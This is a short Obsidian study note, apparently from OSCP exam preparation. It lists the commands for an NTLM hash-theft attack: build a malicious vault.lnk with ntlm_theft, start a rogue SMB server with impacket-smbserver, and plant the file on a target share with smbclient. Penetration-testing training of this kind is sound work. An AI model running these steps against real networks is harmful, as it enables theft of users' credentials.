
Create vault.lnk
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cd ~/Desktop/Tools/Windows/ntlm_theft && python3 ntlm_theft.py -g lnk -s ${ip} -f vault`;

dv.paragraph("```bash\n" + command + "\n```");
```
To fake our SMB server,  **impacket-smbserver**:

```
impacket-smbserver test . -smb2support
```

Put your vault.lnk into the share (Alter the sharename)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cd ~/Desktop/Tools/Windows/ntlm_theft/vault && smbclient //${ip}/[sharename]`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
put vault.lnk
```